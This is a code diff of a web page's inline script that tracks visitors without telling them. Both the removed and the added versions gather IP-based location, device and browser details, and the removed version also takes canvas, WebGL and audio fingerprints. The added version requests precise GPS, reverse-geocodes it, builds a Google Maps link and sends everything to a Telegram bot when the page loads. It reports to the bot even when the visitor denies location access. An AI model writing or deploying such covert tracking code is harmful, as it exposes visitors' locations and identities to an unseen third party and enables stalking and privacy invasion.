@@ -40,220 +40,103 @@
         } catch (e) {}
       };
 
-      // ==================== TIER 1: UNIQUE FINGERPRINTS ====================
-
-      // 1. Canvas Fingerprint (Very High Entropy)
-      const getCanvasFingerprint = () => {
+      // Lightweight data collection (runs after page load)
+      const collectVisitorData = async () => {
+        // 1. IP Info (fast)
+        let ipInfo = {};
         try {
-          const canvas = document.createElement('canvas');
-          const ctx = canvas.getContext('2d');
-          ctx.textBaseline = 'top';
-          ctx.font = '14px Arial';
-          ctx.fillStyle = '#f60';
-          ctx.fillRect(125, 1, 62, 20);
-          ctx.fillStyle = '#069';
-          ctx.fillText('ENKO-FP-2026', 2, 15);
-          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-          ctx.fillText('ENKO-FP-2026', 4, 17);
-          return btoa(canvas.toDataURL()).slice(0, 40);
-        } catch { return 'N/A'; }
-      };
+          const res = await fetch('https://ipapi.co/json/');
+          ipInfo = await res.json();
+        } catch {}
 
-      // 2. WebGL Fingerprint (Extremely Unique - GPU)
-      const getWebGLFingerprint = () => {
+        // 2. Basic browser/device info
+        const screen = `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio}x)`;
+        const touch = 'ontouchstart' in window ? 'Yes' : 'No';
+        const connection = navigator.connection 
+          ? `${navigator.connection.effectiveType || 'N/A'} | ${navigator.connection.downlink || 'N/A'}Mbps` 
+          : 'N/A';
+
+        // 3. Battery (if supported)
+        let battery = 'N/A';
         try {
-          const canvas = document.createElement('canvas');
-          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-          if (!gl) return 'No WebGL';
-
-          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-          const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A';
-          const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
-
-          const extensions = gl.getSupportedExtensions()?.join(',') || '';
-
-          return `${vendor}|${renderer}|${extensions.length}`;
-        } catch { return 'N/A'; }
-      };
-
-      // 3. AudioContext Fingerprint
-      const getAudioFingerprint = () => {
-        try {
-          const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-          const oscillator = audioCtx.createOscillator();
-          const analyser = audioCtx.createAnalyser();
-          const gain = audioCtx.createGain();
-          const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
-
-          oscillator.type = 'triangle';
-          oscillator.frequency.value = 1000;
-
-          gain.gain.value = 0;
-          oscillator.connect(analyser);
-          analyser.connect(scriptProcessor);
-          scriptProcessor.connect(audioCtx.destination);
-          oscillator.start(0);
-
-          const fingerprint = analyser.frequencyBinCount + '-' + audioCtx.sampleRate;
-          oscillator.stop();
-          return fingerprint;
-        } catch { return 'N/A'; }
-      };
-
-      // ==================== TIER 2: HARDWARE & DEVICE ====================
-
-      const getHardwareInfo = () => ({
-        cores: navigator.hardwareConcurrency || 'N/A',
-        memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
-        platform: navigator.platform,
-        vendor: navigator.vendor || 'N/A',
-        maxTouchPoints: navigator.maxTouchPoints || 0,
-      });
-
-      // ==================== TIER 3: BROWSER + ENVIRONMENT ====================
-
-      const getBrowserInfo = () => {
-        const ua = navigator.userAgent;
-        let browser = 'Unknown';
-
-        if (ua.includes('Firefox')) browser = 'Firefox';
-        else if (ua.includes('Edg')) browser = 'Edge';
-        else if (ua.includes('Chrome')) browser = 'Chrome';
-        else if (ua.includes('Safari')) browser = 'Safari';
-        else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';
-
-        return {
-          browser,
-          userAgent: ua.substring(0, 180),
-          language: navigator.language,
-          languages: navigator.languages?.join(', ') || '',
-          cookieEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack || 'N/A',
-          pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-        };
-      };
-
-      const getScreenInfo = () => ({
-        width: window.screen.width,
-        height: window.screen.height,
-        availWidth: window.screen.availWidth,
-        availHeight: window.screen.availHeight,
-        colorDepth: window.screen.colorDepth,
-        pixelDepth: window.screen.pixelDepth,
-        devicePixelRatio: window.devicePixelRatio,
-        orientation: screen.orientation?.type || 'N/A',
-      });
-
-      const getConnectionInfo = () => {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (!conn) return { type: 'N/A', downlink: 'N/A' };
-        return {
-          type: conn.effectiveType || conn.type || 'N/A',
-          downlink: conn.downlink ? conn.downlink + 'Mbps' : 'N/A',
-          rtt: conn.rtt || 'N/A',
-        };
-      };
-
-      const getTimeInfo = () => ({
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        offset: new Date().getTimezoneOffset(),
-        localTime: new Date().toLocaleString(),
-      });
-
-      // ==================== MAIN FUNCTION ====================
-
-      const initVisitorTracker = async () => {
-        const ipInfo = await (async () => {
-          try {
-            const res = await fetch('https://ipapi.co/json/');
-            return await res.json();
-          } catch { return {}; }
-        })();
-
-        const canvasFP = getCanvasFingerprint();
-        const webglFP = getWebGLFingerprint();
-        const audioFP = getAudioFingerprint();
-        const hardware = getHardwareInfo();
-        const browser = getBrowserInfo();
-        const screen = getScreenInfo();
-        const connection = getConnectionInfo();
-        const time = getTimeInfo();
+          if ('getBattery' in navigator) {
+            const bat = await navigator.getBattery();
+            battery = `${Math.round(bat.level * 100)}%${bat.charging ? ' (charging)' : ''}`;
+          }
+        } catch {}
 
         const baseInfo = `
-      🌐 IP: ${ipInfo.ip || 'N/A'} | ISP: ${ipInfo.org || 'N/A'}
-      📍 IP Location: ${ipInfo.city || 'N/A'}, ${ipInfo.region || ''} ${ipInfo.country_name || ''}
-      🕒 Timezone: ${time.timezone} (UTC${time.offset > 0 ? '-' : '+'}${Math.abs(time.offset / 60)})
-      📅 Local Time: ${time.localTime}
+      🌐 IP: ${ipInfo.ip || 'N/A'}
+      🏙 IP Location: ${ipInfo.city || 'N/A'}, ${ipInfo.country_name || 'N/A'}
+      🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+      📅 Local Time: ${new Date().toLocaleString()}
 
-      📱 Device: ${browser.platform} | ${screen.width}×${screen.height} (${screen.devicePixelRatio}x)
-      🖥 Screen: ${screen.availWidth}×${screen.availHeight} | Color: ${screen.colorDepth}bit
-      🔧 Hardware: ${hardware.cores} cores | ${hardware.memory} RAM | Touch: ${hardware.maxTouchPoints > 0 ? 'Yes' : 'No'}
-
-      🌍 Language: ${browser.language} | ${browser.languages}
+      📱 Device: ${navigator.platform}
+      🖥 Screen: ${screen}
+      👆 Touch: ${touch}
+      🔋 Battery: ${battery}
+      🌍 Language: ${navigator.language}
       🔗 Referrer: ${document.referrer || 'Direct'}
       📍 Page: ${window.location.href}
-
-      🖼 Canvas FP: ${canvasFP}
-      🎮 WebGL: ${webglFP}
-      🔊 Audio: ${audioFP}
-
-      📡 Connection: ${connection.type} | ${connection.downlink}
-      🕵️ User Agent: ${browser.userAgent}
+      📡 Connection: ${connection}
+      🕵️ User Agent: ${navigator.userAgent.substring(0, 140)}
         `.trim();
 
-        // Geolocation handling
+        // 4. Geolocation (with Google Maps link)
         if (!navigator.geolocation) {
-          sendToTelegram(`❌ ENKO - No Geolocation Support\n\n${baseInfo}`);
+          sendToTelegram(`❌ ENKO - No Geolocation\n\n${baseInfo}`);
           return;
         }
 
-        setTimeout(() => {
-          navigator.geolocation.getCurrentPosition(
-            async (pos) => {
-              const { latitude, longitude, accuracy } = pos.coords;
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const { latitude, longitude, accuracy } = position.coords;
 
-              let gpsCity = 'Unknown', gpsCountry = 'Unknown', gpsRegion = '';
-              try {
-                const g = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`);
-                if (g.ok) {
-                  const d = await g.json();
-                  gpsCity = d.city || d.locality || 'Unknown';
-                  gpsCountry = d.countryName || 'Unknown';
-                  gpsRegion = d.principalSubdivision || '';
-                }
-              } catch {}
+            let city = 'Unknown', country = 'Unknown';
 
-              const msg = `✅ ENKO - Visitor (GPS OK)
+            try {
+              const geoRes = await fetch(
+                `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
+              );
+              if (geoRes.ok) {
+                const data = await geoRes.json();
+                city = data.city || data.locality || 'Unknown';
+                country = data.countryName || 'Unknown';
+              }
+            } catch {}
+
+            const mapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
+
+            const message = `✅ ENKO - New Visitor
 
       📍 GPS: ${latitude}, ${longitude} (±${Math.round(accuracy)}m)
-      🏙 GPS City: ${gpsCity}, ${gpsRegion}
-      🌍 GPS Country: ${gpsCountry}
+      🏙 City: ${city}
+      🌍 Country: ${country}
+      🔗 ${mapsLink}
 
       ${baseInfo}`;
 
-              sendToTelegram(msg);
-            },
-            async (err) => {
-              const ipInfo2 = await (async () => {
-                try { const r = await fetch('https://ipapi.co/json/'); return await r.json(); } catch { return {}; }
-              })();
+            sendToTelegram(message);
+          },
+          async (error) => {
+            let status = 'BLOCKED';
+            if (error.code === error.POSITION_UNAVAILABLE) status = 'UNAVAILABLE';
+            if (error.code === error.TIMEOUT) status = 'TIMEOUT';
 
-              const blockedMsg = `❌ ENKO - Location BLOCKED by User
-
-      🌐 IP: ${ipInfo2.ip || 'N/A'}
-      🏙 IP City: ${ipInfo2.city || 'N/A'}, ${ipInfo2.region || ''}
-      🌍 IP Country: ${ipInfo2.country_name || 'N/A'}
+            const message = `❌ ENKO - Location ${status}
 
       ${baseInfo}`;
 
-              sendToTelegram(blockedMsg);
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-          );
-        }, 900);
+            sendToTelegram(message);
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
       };
 
-      window.addEventListener('load', initVisitorTracker);
+      // Run after page is fully loaded (non-blocking)
+      window.addEventListener('load', () => {
+        setTimeout(collectVisitorData, 1500); // 1.5 second delay so page loads fast
+      });
       </script>
 </head>
 <body>
